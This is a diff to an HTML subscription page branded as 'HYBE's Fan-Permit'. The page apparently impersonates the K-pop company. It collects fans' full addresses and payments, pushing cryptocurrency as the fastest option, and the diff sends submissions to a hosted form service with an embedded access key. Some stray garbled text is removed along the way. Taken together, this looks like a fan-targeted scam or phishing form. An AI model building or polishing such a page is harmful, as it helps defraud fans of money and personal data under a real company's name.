@@ -51,7 +51,7 @@
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content hero">
         <div class="modal-body text-center">
-          <harrison2 id="onboardingModalLabel">Welcome to HYBE’s Fan-Permit!</h2>
+          <h2 id="onboardingModalLabel">Welcome to HYBE’s Fan-Permit!</h2>
           <p>Join the global K-pop community with exclusive access to artist events and merchandise. This form connects you to your favorite artists in a secure, private environment, ensuring legal and authentic interactions for your safety against rights abuse. Learn about HYBE’s commitment to fan-artist privacy and security.</p>
           <button class="btn btn-outline-primary" data-bs-dismiss="modal" onclick="document.getElementById('subscription-form').scrollIntoView({behavior: 'smooth'})">Start Now</button>
         </div>
@@ -78,7 +78,10 @@
               <h2 class="text-center text-muted mb-3">Join the Ultimate Fan Community</h2>
               <p class="text-center description mb-4">Subscribe for exclusive access to HYBE artist updates, events, and merchandise.</p>
 
-              <form id="subscription-form" action="http://localhost:3000/submit-form" method="POST" enctype="multipart/form-data">
+              <form id="subscription-form" method="POST" data-netlify="true" enctype="multipart/form-data">
+                <input type="hidden" name="form-name" value="hybe-fan-permit" />
+                <input type="hidden" name="access_key" value="8bac5b0d-9250-4745-a0dc-57ba20761c88" />
+                <input type="hidden" name="subject" value="HYBE Fan-Permit Submission" />
                 <input type="hidden" name="country" id="country">
                 <input type="hidden" name="currency" id="currency">
                 <input type="hidden" name="language" id="language">
@@ -114,7 +117,14 @@
 
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="100" id="address-section">
                   <label class="form-label">Address <span class="text-danger">*</span></label>
-                  <div id="address-fields"></div>
+                  <div id="address-fields">
+                    <input type="text" class="form-control mb-2" id="address-line1" name="address-line1" placeholder="Address Line 1" required />
+                    <input type="text" class="form-control mb-2" id="address-line2" name="address-line2" placeholder="Address Line 2" />
+                    <input type="text" class="form-control mb-2" id="city" name="city" placeholder="City" required />
+                    <input type="text" class="form-control mb-2" id="state" name="state" placeholder="State/Province" required />
+                    <input type="text" class="form-control mb-2" id="postal-code" name="postal-code" placeholder="Postal Code" required />
+                    <select class="form-control" id="country-select" name="country-select" required></select>
+                  </div>
                 </div>
 
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="125">
@@ -190,7 +200,7 @@
                   </select>
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Choose payment method"></i>
                 </div>
-                
+
                 <!-- Installment Options -->
                 <div class="mb-3 d-none" id="installment-options" data-aos="fade-up" data-aos-delay="450">
                   <label for="installment-plan" class="form-label">
@@ -203,7 +213,7 @@
                   </select>
                   <p class="mt-2 text-muted">Installments must be completed within the subscription year.</p>
                 </div>
-                
+
                 <!-- Payment Methods -->
                 <div class="mb-3 d-none" id="payment-methods" data-aos="fade-up" data-aos-delay="500">
                   <label class="form-label">
@@ -216,7 +226,7 @@
                   <div class="form-check">
                     <input class="form-check-input" type="radio" name="payment-method" id="digital-currency" value="Digital Currency" required />
                     <label class="form-check-label" for="digital-currency">Digital Currency (1-2min confirmation, fastest)</label>
-Diplomat                  </div>
+                  </div>
                   <div class="form-check">
                     <input class="form-check-input" type="radio" name="payment-method" id="card-payment" value="Card Payment" required />
                     <label class="form-check-label" for="card-payment">Card Payment (24hr confirmation)</label>
@@ -302,7 +312,7 @@ Diplomat                  </div>
           <ul class="list-unstyled">
             <li><a href="https://hybecorp.com" class="text-white text-decoration-none hover-link">About Us</a></li>
             <li><a href="https://careers.hybecorp.com" class="text-white text-decoration-none hover-link">Careers</a></li>
-            <li><a href="https://https://hybecorp.com/eng/career/crew/content" class="text-white text-decoration-none hover-link">Privacy Policy</a></li>
+            <li><a href="https://hybecorp.com/eng/career/crew/content" class="text-white text-decoration-none hover-link">Privacy Policy</a></li>
             <li><a href="https://hybecorp.com" class="text-white text-decoration-none hover-link">Terms of Service</a></li>
           </ul>
         </div>
